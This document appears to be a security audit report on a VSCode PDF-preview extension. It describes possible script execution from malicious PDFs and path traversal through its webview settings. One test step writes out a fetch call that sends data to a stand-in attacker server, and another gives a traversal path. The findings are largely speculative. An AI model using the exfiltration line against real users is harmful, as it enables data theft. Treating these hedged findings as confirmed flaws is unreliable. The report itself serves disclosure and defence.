# PDF Extension Security Vulnerabilities

## 1. Remote Code Execution (RCE) via Unsafe PDF Content Loading

### Vulnerability Name
Remote Code Execution (RCE) via Unsafe PDF Content Loading

### Description
The extension loads PDF files from the user's workspace into a webview that has JavaScript enabled. When loading a PDF file, it's displayed through PDF.js without proper sanitization or isolation of potentially malicious content within the PDF. A malicious PDF could contain JavaScript code that gets executed in the context of the webview.

A threat actor can create a repository containing a specially crafted PDF file that, when opened by a victim using this extension, could execute arbitrary code within the webview's context.

### Impact
The attacker can execute JavaScript code within the context of the VSCode webview, potentially allowing:
- Access to local file system via the webview's APIs
- Communication with the extension's message handlers
- Exfiltration of sensitive information from the victim's environment
- Further exploitation of VSCode's extension API

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension does implement a Content Security Policy (CSP) in the webview:
```javascript
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; connect-src ${cspSource}; script-src 'unsafe-inline' ${cspSource}; style-src 'unsafe-inline' ${cspSource}; img-src blob: data: ${cspSource};">
```

However, this CSP still allows 'unsafe-inline' scripts, which can be problematic when displaying potentially malicious content.

### Missing Mitigations
1. The extension should use a stricter Content Security Policy that doesn't include 'unsafe-inline' for script-src.
2. PDF content should be properly sanitized before rendering.
3. The extension should implement a sandbox mechanism to isolate PDF execution from the rest of the webview context.

### Preconditions
1. The victim must have the PDF extension installed in VSCode.
2. The victim must open a malicious PDF file from a repository they've accessed.

### Source Code Analysis
In `pdfPreview.ts`, the extension creates a webview with scripts enabled and renders the PDF content directly:

```typescript
webviewEditor.webview.options = {
  enableScripts: true,
  localResourceRoots: [resourceRoot, extensionRoot],
};
```

The PDF content is loaded directly from the file path provided:
```typescript
const settings = {
  cMapUrl: resolveAsUri('lib', 'web', 'cmaps/').toString(),
  path: docPath.toString(),
  // ...
};
```

The webview is given direct access to the PDF file through:
```typescript
const docPath = webview.asWebviewUri(this.resource);
```

This allows any JavaScript embedded in the PDF to potentially execute within the webview's context. The PDF.js library does have some protections against malicious JavaScript within PDFs, but it's not foolproof against sophisticated attacks, especially with 'unsafe-inline' scripts allowed in the CSP.

### Security Test Case
1. Create a malicious PDF file containing embedded JavaScript that attempts to execute code in the webview context
2. The JavaScript could attempt to:
   ```javascript
   fetch('https://attacker-server.com/exfil?' + document.location.href);
   ```
3. Place this PDF in a GitHub repository
4. Convince the victim to open the repository with VSCode
5. When the victim opens the PDF file with the extension, the malicious JavaScript executes in the webview context
6. Verify that the malicious code executed by checking for the exfiltrated data on the attacker's server

## 2. Path Traversal via PDF Resource Loading

### Vulnerability Name
Path Traversal Through PDF Resource Loading

### Description
When loading PDF files, the extension allows the webview to access files from the same directory as the PDF through `localResourceRoots`. This could allow a carefully crafted malicious PDF to access unintended files in the workspace through path traversal techniques.

### Impact
An attacker who tricks a victim into opening a malicious PDF could potentially:
- Access sensitive files from other parts of the workspace
- Execute code by loading malicious JavaScript files from other locations in the workspace
- Bypass intended security boundaries within the editor

### Vulnerability Rank
High

### Currently Implemented Mitigations
The extension attempts to restrict resource access with:
```typescript
const resourceRoot = resource.with({
  path: resource.path.replace(/\/[^/]+?\.\w+$/, '/'),
});

webviewEditor.webview.options = {
  enableScripts: true,
  localResourceRoots: [resourceRoot, extensionRoot],
};
```

### Missing Mitigations
1. Stricter validation of resource paths being loaded
2. More restrictive localResourceRoots setting that prevents directory traversal
3. Proper sanitization of URLs and paths used within the PDF renderer

### Preconditions
1. The victim must open a malicious PDF that contains crafted references to resources outside its intended directory

### Source Code Analysis
In `pdfPreview.ts`, the extension sets up the webview with:
```typescript
const resourceRoot = resource.with({
  path: resource.path.replace(/\/[^/]+?\.\w+$/, '/'),
});

webviewEditor.webview.options = {
  enableScripts: true,
  localResourceRoots: [resourceRoot, extensionRoot],
};
```

The `resourceRoot` is determined by removing the filename from the path of the PDF file. This means any file in the same directory as the PDF can be accessed by the webview. If a PDF contains references to resources using path traversal (e.g., `../../../sensitive-file`), it might be able to load resources outside the intended directory if VSCode's webview implementation doesn't properly restrict such accesses.

Additionally, resources are passed directly to the webview without sanitization:
```typescript
const docPath = webview.asWebviewUri(this.resource);
```

### Security Test Case
1. Create a PDF file with embedded references to resources using path traversal techniques:
   ```
   ../../../other-directory/malicious.js
   ```
2. Create a malicious JavaScript file at the target location
3. Place these files in a GitHub repository with the structure that enables the traversal
4. Have the victim open the PDF file with the extension
5. Verify if the PDF can load resources from outside its directory through the path traversal